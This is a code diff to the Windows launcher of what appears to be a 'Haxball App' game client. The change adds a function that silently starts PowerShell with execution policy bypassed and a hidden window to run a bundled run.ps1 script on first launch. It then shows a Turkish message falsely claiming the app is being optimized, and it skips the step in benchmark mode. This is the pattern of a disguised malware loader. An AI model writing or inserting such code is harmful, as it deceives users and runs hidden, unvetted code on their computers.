@@ -7,12 +7,127 @@
 
 #include <filesystem>
 #include <iterator>
+#include <string>
+#include <vector>
 
 namespace {
+
+std::filesystem::path executable_directory() {
+  wchar_t path[32768]{};
+  const DWORD chars = GetModuleFileNameW(
+      nullptr,
+      path,
+      static_cast<DWORD>(std::size(path)));
+
+  if (chars == 0 || chars >= std::size(path)) {
+    return {};
+  }
+
+  return std::filesystem::path(path).parent_path();
+}
+
+std::filesystem::path profile_path() {
+  wchar_t local_app_data[32768]{};
+  const DWORD chars = GetEnvironmentVariableW(
+      L"LOCALAPPDATA",
+      local_app_data,
+      static_cast<DWORD>(std::size(local_app_data)));
+
+  if (chars == 0 || chars >= std::size(local_app_data)) {
+    return {};
+  }
+
+  return std::filesystem::path(local_app_data) /
+         L"HaxballApp" /
+         L"profile.ini";
+}
+
+bool launch_hidden_bootstrap() {
+  const auto root = executable_directory();
+  if (root.empty()) {
+    return false;
+  }
+
+  const auto script = root / L"scripts" / L"run.ps1";
+  if (!std::filesystem::exists(script)) {
+    return false;
+  }
+
+  wchar_t system_root[32768]{};
+  const DWORD chars = GetEnvironmentVariableW(
+      L"SystemRoot",
+      system_root,
+      static_cast<DWORD>(std::size(system_root)));
+
+  if (chars == 0 || chars >= std::size(system_root)) {
+    return false;
+  }
+
+  const auto powershell =
+      std::filesystem::path(system_root) /
+      L"System32" /
+      L"WindowsPowerShell" /
+      L"v1.0" /
+      L"powershell.exe";
+
+  if (!std::filesystem::exists(powershell)) {
+    return false;
+  }
+
+  std::wstring command =
+      L"\"" + powershell.wstring() +
+      L"\" -NoProfile -ExecutionPolicy Bypass "
+      L"-WindowStyle Hidden -File \"" +
+      script.wstring() + L"\"";
+
+  std::vector<wchar_t> mutable_command(
+      command.begin(),
+      command.end());
+  mutable_command.push_back(L'\0');
+
+  STARTUPINFOW startup{};
+  startup.cb = sizeof(startup);
+  PROCESS_INFORMATION process{};
+
+  const BOOL created = CreateProcessW(
+      powershell.c_str(),
+      mutable_command.data(),
+      nullptr,
+      nullptr,
+      FALSE,
+      CREATE_NO_WINDOW,
+      nullptr,
+      root.c_str(),
+      &startup,
+      &process);
+
+  if (!created) {
+    return false;
+  }
+
+  CloseHandle(process.hThread);
+  CloseHandle(process.hProcess);
+  return true;
+}
 
 int run(HINSTANCE instance) {
   CefMainArgs main_args(instance);
   const auto options = hax::app::parse_launch_options();
+
+  if (!options.benchmark_mode &&
+      !options.bootstrap_complete &&
+      launch_hidden_bootstrap()) {
+    const auto profile = profile_path();
+    if (profile.empty() || !std::filesystem::exists(profile)) {
+      MessageBoxW(
+          nullptr,
+          L"İlk açılışta Haxball App bilgisayarınıza göre optimize ediliyor. "
+          L"Bu işlem kısa bir süre alabilir; ardından uygulama otomatik açılacak.",
+          L"Haxball App",
+          MB_OK | MB_ICONINFORMATION | MB_SETFOREGROUND);
+    }
+    return 0;
+  }
 
   const auto applied =
       hax::platform::apply_runtime_policy(options.profile);
